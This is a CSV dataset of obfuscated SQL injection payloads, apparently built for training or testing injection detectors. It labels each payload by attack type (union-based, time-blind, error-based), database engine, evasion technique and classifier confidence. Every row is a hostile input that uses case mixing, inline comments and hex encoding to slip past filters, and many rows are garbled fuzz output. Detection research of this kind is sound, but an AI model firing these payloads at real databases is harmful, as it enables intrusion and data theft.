payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0b0b0b0X1"" ) { WHERE 0xA0B10A :=< 0XA1a AND 0x0x8o24d9 LIKe ( *SeLEcT Count/**/ ( * ) fROM gEnERaTE_SeriEs ?(:?0b10x1,0X0X4c9b0o50 )? ) aND 0B0X1 or 0X0x20E0 LIkE 0b0O0b0b0b111000101010110100110000000100111010111110100010011010011010110001111100100100010001000110110110110000101110111101100000111100111010010110001100010110101 Or (sELeCt (SeLECT (SeLect (sElect 0x6))))*--",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
0b3B0o0B0o0b9X5';$ ){/*Xp)STpi Z0B0o0b11RQb!t*/?$) '] ANd /*W&0b0x3E8X9b0b11X0o0B160 */SLEeP~/*Z6X3G{`vGTA:<A0b110 */(.?3b9O0O0x0B0O0O2b0x4b16x0[~)} |anD ( ; (* +'jIIO' lIkE{'jIiO,unknown,unknown,comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"6o8b2' RlIkE ; ( SELeCT ;( cASE<WHen (( (SELEcT (sELect 2x1f31)) liKe{ (selEcT 0x1E19) ) THEN 0b0x0O2b0x1 ElsE 0x0b1001110 End `) <) AnD;'xNaP' lIKe ,'xnAp",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"4'/*tA$=rk`~$[?*/ ) ) AnD exp (& ~@ (/*2saiU*/ SElEcT * froM ~ (< SeLect cONcAt ( .0x0x6d6e7aa71, =( sElecT ( elt (~/*:uOO;*/0b0X1FFE`]LikE 0b8X212a,(seLecT (SELeCt (SElecT (SElECT (SELECT (seLecT (SElEct 0x1))))))) )( )~ ;/**/ )< ,0x717A0x0b10FfA0X47,0x78: ) ) ~X` ) % ) }anD : )( + ( 'vCph'='VCPH",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"4O0 ) or rOw ( (seleCT (SElEct (seleCT (selEcT (seLecT 1045))))),0x1d8A} ) > ( sELEcT counT ( * ) <,CONCAt ( 0B8b2X0B11011010110111301111617a70, ( SeLEcT -( Elt ( (SELect (selecT (SElECT (seLect 0x1671))))=0x415,(SEleCT (SELECT 3X1)) ] ) ) /*a)~}3I?MoS=*/ ) ,0B0x747a0b0X41EC63E4a91,Flo Or ( rAnD ( 0x0 ) *(selecT (SeleCt 0X2)) )^ /*r*/) X|frOM >( sElEct 0X5128 union sElECT 0X0x15b2 uNIoN seLECT 0XBeb unION sELeCt 0X4Ba ) A grOUp*BY x` )",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"1"" ) ) ) AS THOj whERe (SeLecT (sELect 0X437)) LikE 0X0O0xD7b or chAr ( $(sELECT (seLeCT (seLeCT 97))) ) or chAr ( (sELeCT (selECT (seLEcT 70))) ) ||CHaR ( 0O143 ) ||CHaR: ( ?(SeLECT 86) ) lIke rEGExP_SUbSTRING ( rePeAt (< LEft ( cryPT_keY ( cHaR) ( (sElEct 67) ) oR CHar }( ((SELeCT%(seleCt (SELECt (SeLEcT 0B0x45))))$ ) OR CHAR ( 0O125 ) ,nULL ) (,0o1O2 ) ,(SeLect 0x0b103011a4E902)* ) ,nuLL{>) {aND TrUE or((sElEct (seLECT 0X1981))! noT LiKE 0x1b11 and {> TruE& or ~'Vm' Not LIkE 'Vm'[ Or FaLSE and (seLEcT (sELect (sElect 8549))).NoT LiKE 0B19740101314010 aNd{0x9 Or ' '|not liKe ' ' OR!FALSe oR=(selECT 0x0)\or falSe Or fALsE anD (SeleCT 0x0x0B1) OR falSe OR FalsE and TRuE oR fALse ANd""TRuE> anD true oR (SeleCT 0x4) ANd tRUe oR FaLSe --",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"SeLEct Count ( * )/*_]T;*/ FrOm$GENEraTE_SERIEs ( 0X1,(SeLect 0x0x4c4e1a) ) anD 'rOCa' lIKE 'rOca",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"6/*jM)zo+bB7n {mb*/ ) aS'Azoo""whERe((SelecT+0X9x0o228d)* ;lIKe? (SElECT((sELeCt 0x22E3)) && ( Or 0O0o5X3f5<>0b0x2E7 or FAlse AnD True|anD 5X1 or$""+""<>""+"" OR faLsE OR False AND True#0o4b5Xbcc/*X[;\Bhei*/ LIKe (sELECT 0B0X24) ) *0O15054--'XE; q&[",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
0b101o6'~&& 7x0x0O0b11d0B10D[.=/*S) */?9x8e7X5x13 aNd{'FRvK' =['FRVk,unknown,unknown,comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0b1 [) - ) rLIkE |( sELECt * fROM ( SeLECt ( slEep ( 0b0x0X5 /*\`~}-p(7n.H?] y]0X8!)X<*/ )/**/ ) ) SgVo] ) and $ ( : (/*U*p$ & && ~ \ (Select (SeLeCT (seLEcT (sElEcT (SELEct (selEct (sElecT (SELECT 9537)))))))) IN ((seLECT 0x253a),(sELECt)0o0o53745),(selECt (selECt (seleCt 0x2542)))) OR((sELECt 0X0)$And (SELect>(seLect 1)) ANd truE Or falsE AnD ""\Hg[""!=""\Hg[:"" oR FAlSE oR False OR False#?EC]U*/ 0X0B0o0B11015060110100011C lIke$ 1074B.6E8O0B1011ljA{j",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.05,rule,sqliv5_json,in_clause
"sELeCt ( CaSE*whEn` (/ (selEct (seleCt 9619)) = 0X44e4 ?); ThEN 0x1 else 0X0xa21* (/**/ SELEcT>8x25Cf[fRoM}mAstER..sysDATabASES ) end ) Or FalsE or fAlSE AnD ""Gp0"" nOt lIKE ""gp5E"" AnD (SElect (SELECT 1)) OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"7' ) ) [As hrRa WHeRe (seLect (select 0b70010100115103)) = !0B0X9E0O0B10 and chAR ( (SelecT 0x1FF) )]!/or cHar ( 2B1401101 ) & or chAr ( (SelEct 0o271) ) OR chAR '( (SELEct (sELect/**/0O130))~ )' liKE REGexP_Substring ( REpeAt ^( LEFT% ( crypt_key ( cHar ( 0O0x01) )! = or cHar ( 6X45 ) oR cHar ^( 9B1010011{ ) ,nUll ) ,0x0X0 ^)` ,(SelEct (SeLEct (SElecT (seLECT 0X1dd0725E)))) ) ,NULl ) ^ && tRUE or@fALse Or (sELECT)0x9dD)?nOt[iN:(0X0o11dC,0X9DD,(SelecT (SelEcT (seLECt (sElEct 0xa24))))) AND{'r${l' nOT liKe 'r${lX' or ""V"" NOt lIKe ""V"" or""0Xf80 nOT likE (SElECt (SelEct 0Xf84)) && TruE or FALSE aND ""`b""=""`b"" oR falSe OR False AnD (SelECT (Select (sELEct (sELect (SELECT 6))))) ANd tRue or faLsE Or FALsE --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
5O1 ) [wHeRE 0O20161=(seLeCT 0X1f5a)]RLIKe ( SEleCt ( case WHen^ ( _(SeLEct 0x1e19) likE ^ (seLEcT 0Xa81) ) )THen (SELecT (select (select (SELECT 5)))) ElsE!0x68 EnD ) ?) && tRUE --,unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1"" ) Or ( SelEct (SELEcT 0B110X2)* (} IF] ?( ( )( _sElEcT * fRom - (/*U)""8gbE{C}MF:}C ;eL-(sEleCt (SELECt 0X3))p x`dRK_Ci*/-sEleCt cONcAt ?(@ 0o0x0X0x8d6E0B0b11110100011010101010A41, ( sELEcT ( eLT ( 0B0b0b1111110110001 = (seLect 9x0b1111110011),0X1 ?) "" ;) $ ) ,0x0X717a0xA7A91,0B0x0O0o116 ,) &)/**/ S ) , (sElecT (SELeCt (sELeCT 0x757FEaE0551FED32))), 0X7538dcFB7617Fffa ) _) );and (.|""MEJY""=""MejY",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"8o7%' ` ) ) | ""/)@,'and sleep ( 0B0x0x0x0X5 ) / && < 0o7X0X0O10 aND (SELEct (SELeCt 0Xe15)) (noT Like` 2Xe16 &&~ 9b200016010100 nOT LIkE 0O4225`AND True?OR (sElECT (SELeCt (seleCt (SeleCt_(SelEct (seleCt 0)))))) && 0X1E37 NOT LiKe (SeLEcT (seLecT 0b0x1E38)) Or 0 OR falSE and 0X1f25 lIKE (SElEcT (sELect (sElecT (SELECT 7973)))) OR False AND 0O5003 LIke (SELECT""2563) Or FaLSe oR FalSE#XY%zm; EGQP",unknown,mysql,case_variation|hex_string|scientific_notation,0.05,rule,sqliv5_json,numeric
"1', (_ CaSE WheN{(sEleCt 0o0x0xccB)%= (SELEct<0x8e0x8) tHen<5X3b0o1 ElsE nUll END:*) ;",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O1' aND (seLecT 0X1e3C) ;like ""DbMs_UTIlIty.sqlid_tO_SQLHaSH ""(_ ( } CHR ( 0X71 ) OR Chr ( (seLEcT (SeLECT (SELeCT%3x31)))( ) /*tyjEws}D|]IzfKB{O*/ OR CHr ( 6X0x0b1020271! )"" ~OR chr) (< (SeleCT 0xC0b170){ ) OR cHR ( (SELECT 0X4x0o0b100b) ) or""( SELECT ( CAsE)wHEN (% 0X1E4C ;lIKE 0O26130;_) thEN (seLect (selECT (SELEcT (SeLEct 0O0X1)))) ELse\0b1\ENd {) ? FrOm duaL ) oR Chr (. (SEleCt 0x0X0o40D) )] Or cHr ( 0B3X122C67 ) :`OR cHr ([ (sELEct 0x73); )^ ||Chr [(! (SElecT 0X9X0O7a) ) oR chR ( (selECt (SElect (sElEcT (sElEct (SElECt (SELeCt (SeLECt 0x71))))))) ) ) )",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.11,rule,sqliv5_json,unknown
"0"" ) RLiKe (_~SELeCt ( CAse whEN+| (>/*kJ-(SelEcT (sElECT (SELECT 0x0)))o3*/4X1e0x0O105 ?=_/**/(SeLect (sEleCT (SELECt 6x1e89))) ) \:ThEN (SelecT 0O0o4x9)>Else 0o1x0o6O36 eNd <) ?` ) AND ( ""rkVr"" LIKe ""rkvR",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O5; ): /**/Or]0x0B0b8cf6o3B0b1001-<lIke , (!*select CounT ( m m| W""+"",k8CyD+O*/*DA;/ET YCF*/?)/**/( FroM SysIbm.sYstabLES AS?t6,SysIBM.SySTAbleS AS t0o0o1X1,sYsibM.sYstableS.As T3 ) or FaLsE AnD>trueAnDtrue && tRue Or/(sELeCt (SeLecT (seLECt 0x23e0)))$noT lIKe (SeLeCt<0b00001111100200) And TRUE or_0 , && (sElEct 0X1) OR=FALsE &&~0X1~aNd (SELeCT 1)&aNd ""'"" LiKe ""'"" OR ""BXZ;""=""bXz;V"":aND (SELect OR faLSE And tRUE#(seLEcT (SElecT (SELECT 1)))) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"0b101%"" .OR faLse Or faLse And tRUe Or (SELECT 0)#) OR cHAR* ( 6X30 ) /*KmqS*/or CHaR/*aZf*/ ( 0X45 ) { oR ChaR (! (SELEct (selecT (SeLEcT (SELECT 97)))) {)` or cHAR; ( 0X7O67, )? =]= regexP_subsTRiNG :( rEPeaT ( RIGht ( CHar ( (sElECT (selECt|(SeLect (SelEcT (sElECt (SELeCT 3880)))))) @) ,(seLEct (seLECT?(SelECT)(selECt (selecT 0x0))))) ) ,0x12A0O10Fd0b10E0b0O314 +) ,null% ) aND ) () ""%"" =$""Vvt",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) )[@` As ZPvN>WHerE (sElEcT (SeLeCt (selEct 8b101011001191))) ^liKE (selECT 0O5247) rlIKE ? ( seLeCt (> cAsE wHen ( 0x1e1X1=lIKE\3x0X1E0O51 *)"" theN 0B7 ELsE 0B0x0O9X0o0B601C END[^))/ ) or;0X0X0 Or "" we "" NOT LIkE "" we "" oR ((SELEcT 0x4X0)+ANd tRue && trUe AND tRUE oR ""?"" nOT LIkE ""?"" AnD TRue && tRue and (sElEcT 0x0o1) OR (seLecT (sELEct (SelEct (selecT (sELEcT (select (selEcT 0))))))) OR "")?""<>"")?"" --",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"2b0o1"" .) ) AND/*WAu)0X3 HOC3$*/0b0b0X9184E8923D8=dbms_PIPe.rECeIVe_MEssAge< ( And tRuE oR FALSe#(cHR ( (selEct}(SeLeCT (SELECt 0x25))) ) || cHR or]FALSe aND]tRUe anD ''Y'<>''YX' aND (SeLeCT (selECT 1)) ANd{tRuE ANd tRUE && TRue ANd 0X0X815 nOT Like;(SeLeCT 0B0O0B0b111110211018) ANd (SElEcT (SELECT 4456)) NOt LikE 8459 oR FalSe#(&]0O0b6X9X0x4f :) ^OR chr ( 0X93~ ) ;Or cHr[ ( &(seLect (SELeCt (SelEct (SeLECT (seLECt 29))))) ) ,7O0x2X5 ) --0x2F4 [tdI",unknown,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.06,rule,sqliv5_json,unknown
"0b1'$ ) *) ) anD upDaTeXml ( 0xd48,coNcAT ( 0X0X0x2E,0X0B0B10010101001113100001110110001111000101000001101001000070008110100111100010A51, ]( selECt ( elt ( (SEleCt 0xd0F)=0O0xd0b101001,0X1 ) )? ) ,2X0B1011001101A767A0o0B1101011 ) ,0x0o0X1e9 ) AND ( ;( ( ;'gwEW' like 'gwEW",error_based,mysql,case_variation|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"9')WHERe 0O0O0b0o41035 lIKe( 0X1030 And+(seLect 0O0B1100000111010);LiKe LiKe$`( 'Abcdefg',Upper ( HeX ( rANdOMBLoB ( -(SeLEcT (SeLect (sElecT_(SELECT 0x1e66bee4))))/(SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 2)))))) &) ) !)/**/ ) ANd?""SD"" Like ""Sd"" && } 8x1 --",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.53,rule,sqliv5_json,unknown
SELect } ( CAse whEn ( {0x4e75=5x657 ) ! ThEN 0X4F3d ELsE caST ( (sElECt (seleCT (selECt 0x1))):as inT ) / ( sELECT (sElecT (SELECT 9));fRom DUAl ) eNd ) frOm dUaL--,unknown,oracle,case_variation|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"1, ( /**/SELECT=* From GenErAtE_SeRIes (]""(SeLecT 0X15E9),(SelEct?0b0b1010001111101101011111010000101001),Case wHEN/**/ ( $0x15E9=0O0B1020101101001 ) THeN)1'ElSe 0x8x0/*k2W*(SeLect (SelecT 0X4))+o*/END /**/) +limit}0b0B10 })",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"SELEct?COunT/*eIXpYkU*/ ( ;* ) ( FrOM;ALL_useRs\t0b0O6,All_uSERs=T0o6,ALl_UsERs,t8,all_usErS(T0b0B0b0b3X9E8,ALl_USerS/*YZ Y(.PYEElm|""pJuKEl*/t0O0B1001 anD; ><( ?( ""Swec""@liKE/**/""SWEc",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O8o0o7x6o0B0o11o0B3O0b1089O50 +);\[WHeRE]0B0O9b8O51X0b1001o0B111B0X3B0o0b0o9e0o11X0b810A`^= .0x5Db0B0>UNIOn$all-seLeCT+nuLl,nulL,null,nUlL,nULL,nUlL--",union_based,unknown,case_variation|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"1'`In bOoLEan ModE )^ aNd cHAr ( (sELeCt (sElecT 011)) ) ^||chaR (_ 0X2b7b51110700401011001061101 ) ||char ( (seleCt (seLECt (sEleCt (SELECT 121)))) ) Or cHAR ( 0B1911200 }) LIkE RegeXP_SuBstrING ( REpEAT ( lefT ]( cRYPT_KEy ( cHAR/*f* */ ( 0B0b0O0b0B1000005 ) OR cHAr</( (SeleCT 69) ) or Char ( 0X13, ) ,NULL )< ,(sEleCt (sELecT 0)) ) $,0X1Dcd6705 ))/*A Or fAlSE AnD truE aNd ""}A""<>""}ae""#U/Ot,iAFd*/,nULl ) Or%(SeLect 0) oR fALse or falSe And (SElect (SeLECT (SelEct 1))) aND 4 aNd tRue:|| faLSe OR}(seLECT (selEct (SELecT (SelEct (seLeCt 0))))) And 8415 not:LiKE (SELeCT 0x20E0) OR FaLsE or 6x0 And ""?@d""=""?@d"" OR@fALse#?Z\>5txF]1q>hp;v$Isn",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"0O0B0X0b1""+ ) wherE 0b0X1283 LIkE 0X667 OR ( SEleCT 0X3* ( iF ( ; ( SelecT * FRom ( SElECt_CONcat (`_8x0x0b110D6e1AA37, ( SELEct ([ elT (. (seleCt (seLECt (sELECT 0X1fB1))) Like (selECt (seLECt (seLECT (seLECT (sELecT/*lDE;G*/0x1Fb1))))),0X8 ) ) ;) ,0X815A997a71,7X78 ) ) S ) , 0x7538DcFB76180446, 1x7538dcFb7617FFfA ) ) ` > ) , ""oR FaLSe or 0x8 Or fAlse .Or 'AWB'='awb'' OR fALse AnD (SeLect (sEleCt (SeLEcT 0x1))) or fAlSe oR (SELEct 0x130A)@NoT lIKe 0X130A --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
0x8')OR/C?g0o0x6@*/n=IQ85b*/SLEeP \(~`0O8b0x67~ )/*;@ax h*/~.OR$4X2612!=(seLeCT_0o0X59e0o6)(or fAlse#vT V,unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0 <)> . ) + )/ or CHaR ( 0x8a ;)@ or CHAR /( 0B1030101?)) OR chAr[*( (selEcT 0X37) ) &Or cHAr *( [7B1060101/*(SElect (SELecT 0x1))+"";_tAd{ l*/ )[ lIkE rEgExp_sUBSTriNg ( rePeAT@ ( RighT ""( ChaR ( 0X0X0b0o0xE2d ) ,0b6X0O0)[) ,0Xb2d55E0O0X0b0 ) ,NulL ) And ( ( ( %(seLect (SEleCT (selEct (SELECt or fAlSE Or fAlSE AND 1#(SeLeCT (SeLECT 0x19BC))))))[= (sElEct (select (seleCT 0588)))%X",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"4' ) . ) ) | Or> (sEleCT (SELeCT (SELECT (SELECT (SELECT 6487)))))>= DBms_PiPE.REceIve_mESsaGE (* chr ( 0X0B0o1B0X3bb0D8faaB08b0O1474A4 ) ,&or^CHR >( &(SeleCT 0o0o3B0b8x57) ) > || cHR (^`0o0x50 /); Or chR/*w*/ ( (seLeCt (selECT 7x135)); ) _,(SElECT.(sEleCt (SELEcT (seLecT 0O5))))/*JTey*/=) .=AnD /0X2]And 0x1 ;OR fALsE oR FalsE or (seLECT!(sElEcT 0x0)) aNd trUE/**/AnD trUe}OR 0x0x10E1B7}nOt.LiKe 4x46DE?ANd trUe OR@FAlSe aND 'F' nOT lIKE 'fD';--",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
0X0o7B2041'+ ( /*mr*/sElECt 'njEe'[WHErE 0X0b0b0b1000010001110105011000101111012f0b1001 LIKE;0O0X0O1523B ANd (seLeCT%(SeLEcT (selecT 0xBff))) == %(selECT[0x0b1E8B) >) ;OR (sElEct 0x14ec)<>0x17EC anD (SelecT 1)#+'e[,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"5x0O11' )_] ANd_(sELECt]6x8b1C5a) LiKE [8X0B0b4B10110001111011111e0 , aND & <! ( $'ktlZ'""LikE 'kTlZ",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B0B1111211100x0x6x8B0x3e8o0B0X0B0b0b0X5AdB0B0b1110110x3X0O1b8X0x0b101o0O9o0B80O83B9B2o0X0O31o6eE?(^) *&() * unION/ALL*SeLeCt^NUlL,nulL,nulL,nUlL,nULL,NUlL,nuLL--",union_based,unknown,case_variation|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"4X9' or ( SElEct 'YmWF'&wHERe (SElecT (SElECt 0X4C8)) =! 8x6bC oR cHar ( 4o104 ) OR ChaR ({ 0X0o55 ); ||cHar ( 2x0x2b0b0X0O35 ) }$]oR ,char (] (sElEct (select (sEleCT (sELeCT<(SElEcT (SelecT (seLEct (SELECT (SELECT 65))))))))) ) lIke reGExP_SUBstRiNg <( REpEat@)( )RiGHt% ( cHAr ( (sELect 0O52415) ) ,(SeLeCT 0B0) ) "",(sELECt 0x14d00E250)) )[ ,nULl ! )) ))_ OR '",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B1o0O5O0b8o9o0o0o1~ ) )) ) anD\4B0O0x0o3o0O0Xa8C/*8o;[pB */ LIKe ( sELecT COUNt () * ) `_From-sySusERS AS SYs2,SYsUsERS AS:Sys8,sYsuSeRS as sys3,sYsUSERS as`syS0O0o80,SySusERs as;sys1x0o5,SySusers+as$sYS3B110,SySuSers AS\sys6 )> ! AND? &TRue`aND/*pOd4~X}6h{IA& W*/(sElEcT (select 3xAC4)) not liKe<(SELEcT (selecT (sELect (SELecT;(seleCT~(SeLEcT 0x6E4D)))))) oR FAlSE}--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1"" ) = ) aS DsHc WhERe 0x23BA LIKE (selEct (SelECt 0X25b7))=OR*0X0o7E6=~lIKE/ ( seLECt CouNt () * ) ?from All_USErs t4,aLL_uSERs t0o2,all_usERS T3,aLL_userS T4,ALL_USErs t5 -) ~AND 0x0O0b0o2053 nOt;LikE (seLeCT 9x1eE) oR ""DR""=""drs""'aND 0x1 AnD ""6"" ? nOt like ""0X5X6h"" AnD (sELect (SelEcT 0X1)) And ""F0X6 "" nOt = ""f5 e"" aND ""^q""""NoT lIkE ""^qc"" aNd TrUe Or false Or (SelecT (seleCt (sELECT (selEct (seLEcT (seleCt (SelEct (SeLeCt (SELEcT (seLect (sELeCT 0))))))))))) aNd ""=""[Not LikE(""=M"" OR 0b0X0 && ""3N0^""=""3n0^"" anD ""5}.\p""<>""5}.\p,"" OR! fALSe && trUe ANd ""e ""<>""E m"" And 0X1 Or FALSE && (SELECT 1) OR False --",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"1'|-) Or/0X0 AND ""AeQjZ"" nOT liKe ""aEQjzU""$AnD$(SELEcT 0X1) or (SeLECt (selecT 0)) Or FaLsE OR fALSe OR False#wHEre^5X2548[ = 0x2548 OR EXP ?( +~ ( sElECT * FROm ([ sElEct CONcAt ( *0X0X0X6D6e7aA30, ( >SELeCT ( elt@{( 0x187E=(sElECT (SElEcT (sELect (sElEcT (seleCt (SeLECt (SelEct (sELEcT (SeLECt 6210))))))))),0O1 ) ) ) :,0X717A0x9B10fFA5B0o107,0x0x0X0o4E ) } ) x ).""? ) --,t;2X4 ,hN{~CQ",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"CALl rEgexp_SUBsTRINg (} repEaT (, leFt ( CRyPt_kEY ( cHAr ( /*AJup u*/5O0b9101101 {) oR CHar_ ( 0X0b101111 ;) ?Or Char `( 0X0B1510111# ); ,NULl! ) ,(selEct 0b0x0O11) `) ,0x9X1E0O70B0b1110107167 ) ,NULL; );*|&& ""cuZI"" Like ""CUzi4}&E",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o0B0b0X0x0x0o0B0x0x0o0x0x1"", ) {AS HFvz WHerE%0X1C0b0B1100 oR ""ez"" not(lIkE ""ez"" oR ""8""=""8`""/And/*coye`z$BoA:O*bR*/TrUe &&`"" tU "" Not lIKe:"" tu C"" Or (seLeCT (SElecT (SELeCT (sELeCt (SeLECt (SELECt (SElEct 0))))))) && '6'='4O6' or (selEct&(SElEct 0x22e5))=(SELECT 8934) Or FaLsE OR FaLsE OR falSe OR False#.=. 6x0X1c0O0x6O15""unION ALL SelECT\nUll,NuLl,NUll,NULL,null,nuLl: && tRUe`AND trUE#JSbhaC8 m",union_based,unknown,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"0O1' %) aNd ( Select 0o0X236B FROM ( SeLECt]cOuNT ( )* ) ,ConCAT ( 0x0b0b10010110101000101111000011101010000111100010101011000111101111111011100010A71, ( _SELEcT !( eLT (/*&>(seLEcT (seLecT 0x1)) OR FALSe#)PM,Z%cV`R6s*/ 0x236b LiKe (SELeCt (SElect 0X236B)),(SElECt (SEleCt (SELECT 1))) ) ) ), ,0x0B0B0b1011001101111101111000110001110100100001101110111010011010000100000010100100111111101011001111111A0X0x0O0o2e1A0x0b0o907,fLoor ( R AnD ( 0X0O0 )/ *4b0X0x2 ) ) x FROM inF||MAtioN_SchEMA.ChARacTeR_SetS GrOUp By x ) A )& aNd ( 'wFws' liKe: 'WfwSOZ4Q]8(zz)7X t =ueG",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0X1' -Or'[|=( +SelECt 'vsfg'*WhERe (SeleCt (seLEct<0XDDb))=0b5B110b0B0b1130110106011010111011101000100110011 AnD , upDAtExML} (^ 0O0xD41,coNcat ( 0B11x2E,0o0x0X1x9X6D6e7AA0X47, ( selECt (&[Elt (</*lJVamV\xJ0o4R Jp2*/(SElecT~(sElEcT=5XD41)) [>]lIKE< !0Xd0O0b0b0B1001110,8X0o1/*11*/ ) ; )| ) ,0X0b0B6X487a4b1011111111a9X0o117 )""!,0o0b0o1X0X4b111151001&+.) ) ""Or&~ '",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O0o0O0xa' \)>/*(SELECT 4)*/ ?) )/*jvn\*g.E;qY[(sELEct=(sELEcT 0o4X0x0o11)).oa8X201=c ;=U}Ghb{tMI;M:rAWQ */ RliKE$ (] SeLECT (/>CASE wHEN ( (SeleCt 0x0o0dDD)[ LIkE 0x2o0B9e9 )< THen 1X0O8B0O1 elsE:8x42 eND <<) )` LIKE ANd, (; ( "" '( &'GsJP') ;+lIke : 'gsJP",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"SeLect COunT ( * ) From GENeRAte_sERIeS (\ (sElect/**/1),(seLEcT&9X4c4E60) *) \ aNd %( 'cEWN' lIkE 'cEWN",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
